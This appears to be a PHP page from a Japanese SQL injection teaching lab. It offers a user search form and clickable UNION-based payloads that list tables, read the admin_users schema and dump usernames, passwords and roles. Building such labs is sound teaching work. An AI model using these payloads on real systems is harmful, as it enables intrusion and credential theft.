<?php include '../includes/header.php'; ?>

<div class="container">
    <div class="card shadow-sm border-0 p-4">
        <h1 class="h5 fw-bold mb-4 text-primary">SQLインジェクション実行環境</h1>

        <div class="row g-4">
            <div class="col-md-5">
                <div class="list-group shadow-sm">
                    <div class="list-group-item bg-secondary text-white fw-bold small text-center">Payloads (クリックで入力)</div>
                    <button type="button" class="list-group-item list-group-item-action py-3" onclick="copyToInput(`' OR 1=1 --`)">
                        <code class="text-danger fw-bold">' OR 1=1 --</code>
                        <div class="small text-muted">全件表示</div>
                    </button>
                    <button type="button" class="list-group-item list-group-item-action py-3" onclick="copyToInput(`'`)">
                        <code class="text-danger fw-bold">'</code>
                        <div class="small text-muted">SQLエラー体験</div>
                    </button>
                    <button type="button" class="list-group-item list-group-item-action py-3" onclick="copyToInput(`' UNION SELECT 1, name FROM sqlite_master WHERE type='table' --`)">
                        <code class="text-danger fw-bold">' UNION SELECT...</code>
                        <div class="small text-muted">UNION攻撃で他のテーブルを確認</div>
                    </button>
                    <button type="button" class="list-group-item list-group-item-action py-3" onclick="copyToInput(`' UNION SELECT 1, sql FROM sqlite_master WHERE name='admin_users' --`)">
                        <code class="text-danger fw-bold">' UNION SELECT...</code>
                        <div class="small text-muted">UNION攻撃でユーザーテーブルのカラムを確認</div>
                    </button>
                    <button type="button" class="list-group-item list-group-item-action py-3" onclick="copyToInput(`' UNION SELECT id, username || ' / PW:' || password || ' / Role:' || role FROM admin_users --`)">
                        <code class="text-danger fw-bold">' UNION SELECT...</code>
                        <div class="small text-muted">UNION攻撃でユーザーテーブルからパスワードなどを入手</div>
                        <div class="small text-muted">※本来はDBにパスワードなどは暗号化され、ソルトがあるのが一般的です</div>
                    </button>
                </div>
            </div>

            <div class="col-md-7">
                <div class="p-3 border rounded bg-white shadow-sm mb-4">
                    <label class="form-label small fw-bold">ユーザー検索フォーム</label>

                    <form hx-get="../db/user.php" hx-target="#result">
                        <div class="input-group mb-3">
                            <input type="text" id="search-input" name="name" class="form-control border-primary shadow-none">
                            <button type="submit" class="btn btn-primary px-4 fw-bold">検索実行</button>
                        </div>
                    </form>

                    <div class="mt-3">
                        <p class="small text-muted mb-2 fw-bold">【登録済みユーザー（クリックで入力）】</p>
                        <div class="d-flex flex-wrap gap-2">
                            <style>
                                .user-tag {
                                    cursor: pointer;
                                    transition: 0.2s;
                                }

                                .user-tag:hover {
                                    background-color: #e9ecef !important;
                                }
                            </style>

                            <span class="badge bg-light text-dark border user-tag" hx-on:click="document.getElementById('search-input').value = this.innerText">佐藤太郎</span>
                            <span class="badge bg-light text-dark border user-tag" hx-on:click="document.getElementById('search-input').value = this.innerText">鈴木花子</span>
                            <span class="badge bg-light text-dark border user-tag" hx-on:click="document.getElementById('search-input').value = this.innerText">高橋一郎</span>
                            <span class="badge bg-light text-dark border user-tag" hx-on:click="document.getElementById('search-input').value = this.innerText">田中美咲</span>
                            <span class="badge bg-light text-dark border user-tag" hx-on:click="document.getElementById('search-input').value = this.innerText">伊藤健</span>
                            <span class="badge bg-light text-dark border user-tag" hx-on:click="document.getElementById('search-input').value = this.innerText">渡辺奈々</span>
                            <span class="badge bg-light text-dark border user-tag" hx-on:click="document.getElementById('search-input').value = this.innerText">山本翔</span>
                            <span class="badge bg-light text-dark border user-tag" hx-on:click="document.getElementById('search-input').value = this.innerText">中村優子</span>
                            <span class="badge bg-light text-dark border user-tag" hx-on:click="document.getElementById('search-input').value = this.innerText">小林直樹</span>
                            <span class="badge bg-light text-dark border user-tag" hx-on:click="document.getElementById('search-input').value = this.innerText">加藤真由美</span>
                        </div>
                    </div>
                </div>
                <div class="card shadow-sm border-0">
                    <div class="card-header bg-light small fw-bold text-muted">実行結果出力 (Database Output)</div>
                    <div id="result" class="card-body bg-white font-monospace text-break" style="min-height: 200px;">
                        <span class="text-muted small">ここに検索結果が表示されます...</span>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- クリック時のコピー -->
<script>
    function copyToInput(text) {
        const input = document.querySelector("input[name='name']");
        input.value = text;
        input.focus();
        // 視覚的なフィードバック
        input.classList.add('is-valid');
        setTimeout(() => input.classList.remove('is-valid'), 300);
    }
</script>

<?php include '../includes/footer.php'; ?>